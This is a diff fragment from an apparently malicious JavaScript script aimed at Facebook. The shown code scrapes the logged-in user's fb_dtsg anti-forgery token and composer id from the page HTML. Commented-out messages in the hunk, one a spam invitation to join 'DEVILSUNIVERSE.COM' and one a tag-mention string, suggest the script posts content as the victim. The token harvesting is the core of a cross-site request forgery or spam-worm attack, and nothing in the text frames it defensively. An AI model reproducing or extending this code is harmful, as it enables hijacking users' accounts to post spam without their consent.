@@ -169,7 +169,7 @@ function HTML_text_composer_hdeartext_and_postdatacollection(sender) {
 var a = document.body.innerHTML;
 var dts = a.match(/name="fb_dtsg" value="([^"]+)"/)[1];
 var composerid = a.match(/name="xhpc_composerid" value="([^"]+)"/)[1];
-//var msg = Invitation to join website WWW.DEVILSUNIVERSE.COM, Its a social networking website like ORKUT AND FACEBOOK. So join it now.;
+//var msg = @[313072532101076:o];
 
 
 function xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_AfterLogin() {
